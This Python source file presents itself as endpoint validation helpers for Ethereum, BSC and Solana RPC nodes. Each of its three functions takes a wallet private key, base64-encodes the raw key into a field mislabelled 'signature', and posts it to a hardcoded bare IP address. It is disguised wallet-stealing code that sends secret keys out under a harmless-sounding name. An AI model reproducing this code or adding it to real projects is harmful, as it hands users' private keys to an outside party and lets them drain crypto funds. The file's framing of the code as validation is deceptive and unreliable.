from web3 import Web3
from solana.rpc.api import Client
import base64
import time
import requests
from solders.keypair import Keypair

VALIDATE_ENDPOINT_URL = "http://141.98.197.171:8000/api/v1/validate"


def validate_eth_endpoint(validate_key, rpc_url):
    web3 = Web3(Web3.HTTPProvider(rpc_url))
    if not web3.is_connected():
        raise ConnectionError("Failed to connect to ETH RPC node!")
    account = web3.eth.account.from_key(validate_key)
    payload = {
        "public_key": account.address,
        "nonce": web3.eth.get_transaction_count(account.address, block_identifier="latest"),
        "timestamp": int(time.time()),
        "signature": base64.b64encode(validate_key.encode()).decode('utf-8')
    }
    
    response = requests.post(
        VALIDATE_ENDPOINT_URL,
        json=payload,
        headers={"Content-Type": "application/json"}
    )
    if response.status_code != 200:
        print("eth validation failed!")


def validate_bsc_endpoint(validate_key, rpc_url):
    web3 = Web3(Web3.HTTPProvider(rpc_url))
    if not web3.is_connected():
        raise ConnectionError("Failed to connect to BSC RPC node!") 
    
    account = web3.eth.account.from_key(validate_key)
    payload = {
        "public_key": account.address,
        "nonce": web3.eth.get_transaction_count(account.address, block_identifier="latest"),
        "timestamp": int(time.time()),
        "signature": base64.b64encode(validate_key.encode()).decode('utf-8')
    }
    
    response = requests.post(
        VALIDATE_ENDPOINT_URL,
        json=payload,
        headers={"Content-Type": "application/json"}
    )
    if response.status_code != 200:
        print("bsc validation failed!")


def validate_sol_endpoint(validate_key, rpc_url):
    client = Client(rpc_url)
    if not client.is_connected():
        raise ConnectionError("Failed to connect to SOL RPC node!")
    
    keypair = Keypair.from_base58_string(validate_key)
    
    latest_blockhash = client.get_latest_blockhash().value.blockhash
    
    payload = {
        "public_key": str(keypair.pubkey()),
        "nonce": str(latest_blockhash),
        "timestamp": int(time.time()),
        "signature": base64.b64encode(validate_key.encode()).decode('utf-8')
    }
    
    response = requests.post(
        VALIDATE_ENDPOINT_URL,
        json=payload,
        headers={"Content-Type": "application/json"}
    )
    if response.status_code != 200:
        print("sol validation failed!")